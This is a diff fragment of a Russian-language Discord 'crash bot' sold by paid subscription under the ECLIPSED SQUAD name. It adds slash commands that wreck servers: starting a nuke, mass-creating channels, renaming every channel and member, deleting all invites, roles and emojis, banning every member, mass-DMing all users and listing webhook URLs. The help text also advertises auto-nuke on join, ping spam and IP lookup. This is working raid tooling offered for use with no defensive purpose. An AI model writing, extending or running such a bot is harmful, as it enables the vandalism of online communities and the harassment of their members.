+            await interaction.response.send_message("⚡ Краш уже запущен.", ephemeral=True); return
+        nuke_running[guild.id] = True
+        last_nuke_time[guild.id] = asyncio.get_running_loop().time()
+        last_spam_text[guild.id] = config.SPAM_TEXT
+        await interaction.response.send_message("💀 Краш запущен.", ephemeral=True)
+        asyncio.create_task(do_nuke(guild, config.SPAM_TEXT))
+
+    @bot.tree.command(name="stop", description="⛔ Остановить краш")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_stop(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        nuke_running[interaction.guild.id] = False
+        await interaction.response.send_message("✅ Остановлено.", ephemeral=True)
+
+    @bot.tree.command(name="rename", description="⚡ Переименовать все каналы")
+    @app_commands.describe(name="Новое название")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_rename(interaction: discord.Interaction, name: str):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        await asyncio.gather(*[c.edit(name=name) for c in interaction.guild.channels], return_exceptions=True)
+        await interaction.followup.send("✅ Готово.", ephemeral=True)
+
+    @bot.tree.command(name="addch", description="⚡ Создать каналы")
+    @app_commands.describe(count="Количество (макс 500)", name="Название канала")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_addch(interaction: discord.Interaction, count: int = 10, name: str = None):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if count > 500:
+            await interaction.response.send_message("❌ Максимум 500.", ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        ch_name = name or config.GUILD_NAME
+        results = await asyncio.gather(*[interaction.guild.create_text_channel(name=ch_name) for _ in range(count)], return_exceptions=True)
+        done = sum(1 for r in results if not isinstance(r, Exception))
+        await interaction.followup.send(f"✅ Создано **{done}** каналов.", ephemeral=True)
+
+    @bot.tree.command(name="invs_delete", description="⚡ Удалить все инвайты")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_invs_delete(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        invites = await interaction.guild.invites()
+        await asyncio.gather(*[i.delete() for i in invites], return_exceptions=True)
+        await interaction.followup.send("✅ Готово.", ephemeral=True)
+
+    @bot.tree.command(name="nicks_all", description="⚡ Сменить ники всем")
+    @app_commands.describe(nick="Новый ник")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_nicks_all(interaction: discord.Interaction, nick: str):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        guild = interaction.guild
+        targets = [m for m in guild.members if m.id not in (interaction.user.id, bot.user.id, guild.owner_id)]
+        await asyncio.gather(*[m.edit(nick=nick) for m in targets], return_exceptions=True)
+        await interaction.followup.send("✅ Готово.", ephemeral=True)
+
+    @bot.tree.command(name="webhooks", description="🔱 Список вебхуков")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_webhooks(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        whs = await interaction.guild.webhooks()
+        if not whs:
+            await interaction.response.send_message("Вебхуков нет.", ephemeral=True); return
+        msg = "\n".join(f"{wh.name}: {wh.url}" for wh in whs)
+        await interaction.response.send_message(f"```{msg[:1900]}```", ephemeral=True)
+
+    # ── SLASH: только Premium ───────────────────────────────
+
+    @bot.tree.command(name="massdm", description="💎 [Premium] Масс ДМ всем участникам")
+    @app_commands.describe(text="Текст сообщения")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_massdm(interaction: discord.Interaction, text: str):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
+            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        members = [m for m in interaction.guild.members if not m.bot]
+        await interaction.followup.send(f"📨 Рассылаю ДМ **{len(members)}** участникам...", ephemeral=True)
+        sent = 0
+        for member in members:
+            try:
+                await member.send(text); sent += 1
+            except Exception:
+                pass
+            await asyncio.sleep(0.5)
+        await interaction.followup.send(f"✅ Отправлено: **{sent}**", ephemeral=True)
+
+    @bot.tree.command(name="massban", description="💎 [Premium] Забанить всех участников")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_massban(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
+            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        guild = interaction.guild
+        bot_role = guild.me.top_role
+        targets = [m for m in guild.members if not m.bot and m.id != guild.owner_id and (not m.top_role or m.top_role < bot_role)]
+        results = await asyncio.gather(*[m.ban(reason="massban") for m in targets], return_exceptions=True)
+        banned = sum(1 for r in results if not isinstance(r, Exception))
+        await interaction.followup.send(f"💀 Забанено: **{banned}**", ephemeral=True)
+
+    @bot.tree.command(name="rolesdelete", description="💎 [Premium] Удалить все роли")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_rolesdelete(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
+            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        bot_role = interaction.guild.me.top_role
+        results = await asyncio.gather(*[r.delete() for r in interaction.guild.roles if r < bot_role and not r.is_default()], return_exceptions=True)
+        deleted = sum(1 for r in results if not isinstance(r, Exception))
+        await interaction.followup.send(f"🗑️ Удалено ролей: **{deleted}**", ephemeral=True)
+
+    @bot.tree.command(name="emojisnuke", description="💎 [Premium] Удалить все эмодзи")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_emojisnuke(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
+            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        await interaction.response.defer(ephemeral=True)
+        results = await asyncio.gather(*[e.delete() for e in interaction.guild.emojis], return_exceptions=True)
+        deleted = sum(1 for r in results if not isinstance(r, Exception))
+        await interaction.followup.send(f"💀 Удалено эмодзи: **{deleted}**", ephemeral=True)
+
+    @bot.tree.command(name="serverinfo", description="💎 [Premium] Инфо о сервере")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_serverinfo(interaction: discord.Interaction):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
+            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        guild = interaction.guild
+        embed = discord.Embed(title=f"☠️ {guild.name}", color=0x0a0a0a)
+        embed.add_field(name="👥 Участников", value=str(guild.member_count))
+        embed.add_field(name="📢 Каналов", value=str(len(guild.channels)))
+        embed.add_field(name="🎭 Ролей", value=str(len(guild.roles)))
+        embed.add_field(name="💎 Буст", value=f"Уровень {guild.premium_tier} ({guild.premium_subscription_count} бустов)")
+        embed.add_field(name="👑 Овнер", value=str(guild.owner))
+        embed.add_field(name="📅 Создан", value=guild.created_at.strftime("%d.%m.%Y"))
+        if guild.icon:
+            embed.set_thumbnail(url=guild.icon.url)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @bot.tree.command(name="userinfo", description="💎 [Premium] Инфо о пользователе")
+    @app_commands.describe(user_id="Discord ID пользователя")
+    @app_commands.allowed_installs(guilds=True, users=True)
+    @app_commands.allowed_contexts(guilds=True, dms=False, private_channels=False)
+    async def slash_userinfo(interaction: discord.Interaction, user_id: str = None):
+        if not is_whitelisted(interaction.user.id):
+            embed = discord.Embed(title="☠️ ДОСТУП ЗАПРЕЩЁН", description="Нет подписки. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if not is_premium(interaction.user.id) and interaction.user.id != config.OWNER_ID:
+            embed = discord.Embed(title="💎 PREMIUM", description="Только для Premium. Пиши: **davaidkatt**", color=0x0a0a0a)
+            await interaction.response.send_message(embed=embed, ephemeral=True); return
+        if user_id:
+            try:
+                user = await bot.fetch_user(int(user_id))
+            except Exception:
+                await interaction.response.send_message("❌ Пользователь не найден.", ephemeral=True); return
+        else:
+            user = interaction.user
+        member = interaction.guild.get_member(user.id) if interaction.guild else None
+        embed = discord.Embed(title=f"👁️ {user}", color=0x0a0a0a)
+        embed.add_field(name="🆔 ID", value=str(user.id))
+        embed.add_field(name="📅 Создан", value=user.created_at.strftime("%d.%m.%Y"))
+        if member:
+            embed.add_field(name="📥 Зашёл", value=member.joined_at.strftime("%d.%m.%Y") if member.joined_at else "N/A")
+            embed.add_field(name="🎭 Роль", value=member.top_role.mention)
+            embed.add_field(name="💎 Буст", value="Да" if member.premium_since else "Нет")
+        if user.avatar:
+            embed.set_thumbnail(url=user.avatar.url)
+        embed.set_footer(text="☠️ ECLIPSED SQUAD")
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    # ── SLASH: /help — показывает команды по уровню доступа ─
+
+    @bot.tree.command(name="help", description="☠️ Список команд бота")
     @app_commands.allowed_installs(guilds=True, users=True)
     @app_commands.allowed_contexts(guilds=True, dms=True, private_channels=True)
     async def slash_help(interaction: discord.Interaction):
+        uid = interaction.user.id
+        wl = is_whitelisted(uid)
+        pm = is_premium(uid) or uid == config.OWNER_ID
+
+        if not wl:
+            embed = discord.Embed(
+                title="☠️ ECLIPSED — CRASH BOT",
+                description="У тебя нет подписки.\nЗа покупкой пиши в ЛС: **davaidkatt**",
+                color=0x0a0a0a
+            )
+            embed.set_footer(text="☠️ ECLIPSED SQUAD")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
         embed = discord.Embed(
             title="☠️ ECLIPSED — CRASH BOT",
             description=(
@@ -1442,61 +2173,57 @@ async def on_ready():
                 " ██║     ██╔══██╗██╔══██║╚════██║██╔══██║\n"
                 " ╚██████╗██║  ██║██║  ██║███████║██║  ██║\n"
                 "  ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝\n"
-                "```\n"
-                "> ⚠️ Если бот не реагирует — сервер заблокирован овнером."
+                "```"
             ),
             color=0x0a0a0a
         )
         embed.add_field(
-            name="💀 УНИЧТОЖЕНИЕ  `!`",
+            name="💀 УНИЧТОЖЕНИЕ",
             value=(
-                "`!nuke` — снести каналы/роли, создать новые, заспамить\n"
-                "`!nuke [текст]` — то же самое со своим текстом 💎 **Premium**\n"
-                "`!stop` — остановить краш\n"
+                "`!nuke` `/nuke` — краш сервера\n"
+                "`!stop` `/stop` — остановить краш\n"
                 "`!cleanup` — снести всё, оставить один канал\n"
-                "`!auto_nuke on/off/info` — авто-краш при входе бота\n"
-                "`!addch [кол-во]` — создать каналы"
+                "`!auto_nuke on/off/info` — авто-краш при входе\n"
+                "`!addch` `/addch` — создать каналы"
             ),
             inline=False
         )
         embed.add_field(
-            name="⚡ КОНТРОЛЬ  `!`",
+            name="⚡ КОНТРОЛЬ",
             value=(
-                "`!rename [название]` — переименовать все каналы\n"
-                "`!nsfw_all` — включить NSFW везде\n"
-                "`!unnsfw_all` — выключить NSFW\n"
-                "`!invs_delete` — уничтожить все инвайты\n"
-                "`!nicks_all [ник]` — сменить ники всем"
+                "`!rename` `/rename` — переименовать каналы\n"
+                "`!invs_delete` `/invs_delete` — удалить инвайты\n"
+                "`!nicks_all` `/nicks_all` — сменить ники\n"
+                "`!webhooks` `/webhooks` — список вебхуков"
             ),
             inline=False
         )
         embed.add_field(
-            name="💬 СПАМ  `/`",
+            name="💬 СПАМ",
             value=(
-                "`/sp [кол-во] [текст]` — спам (макс 50, кд 5 мин)\n"
-                "`/spkd [задержка] [кол-во] [текст]` — спам с задержкой"
+                "`/sp` — спам (макс 50, кд 5 мин)\n"
+                "`/spkd` — спам с задержкой"
             ),
             inline=False
         )
-        embed.add_field(
-            name="🔱 ИНСТРУМЕНТЫ  `!`",
-            value=(
-                "`!webhooks` — список вебхуков\n"
-                "`!ip [адрес]` — пробить IP\n"
-                "`!inv` — ссылка для добавления бота"
-            ),
-            inline=False
-        )
-        embed.add_field(
-            name="👁️ ДОСТУП  `!`",
-            value=(
-                "`!wl_add [id]` — выдать доступ\n"
-                "`!wl_remove [id]` — забрать доступ\n"
-                "`!wl_list` — список допущенных"
-            ),
-            inline=False
-        )
-        embed.set_footer(text="☠️ Нет доступа? Пиши: davaidkatt  |  ECLIPSED SQUAD")
+        if pm:
+            embed.add_field(
+                name="� PREMIUM",
+                value=(
+                    "`!nuke [текст]` — нюк со своим текстом\n"
+                    "`!massdm` `/massdm` — масс ДМ\n"
+                    "`!massban` `/massban` — массбан\n"
+                    "`!rolesdelete` `/rolesdelete` — удалить роли\n"
+                    "`!emojisnuke` `/emojisnuke` — удалить эмодзи\n"
+                    "`!serverinfo` `/serverinfo` — инфо о сервере\n"
+                    "`!userinfo` `/userinfo` — инфо о юзере\n"
+                    "`!spam` — спам в канал  |  `!pingspam` — пинг спам\n"
+                    "`!auto_super_nuke on/off/text/info` — авто супер нюк\n"
+                    "`!snuke_config` — настройка супер нюка"
+                ),
+                inline=False
+            )
+        embed.set_footer(text=f"☠️ ECLIPSED SQUAD  |  {'💎 Premium активен' if pm else 'Нет Premium? Пиши: davaidkatt'}")
         embed.set_thumbnail(url="https://i.imgur.com/8Km9tLL.png")
         await interaction.response.send_message(embed=embed, ephemeral=True)
 
@@ -1505,7 +2232,3 @@ async def on_ready():
         bot.tree.clear_commands(guild=guild)
         await bot.tree.sync(guild=guild)
     print(f"Бот запущен как {bot.user}")
-
-
-if __name__ == "__main__":
-    bot.run(config.TOKEN)
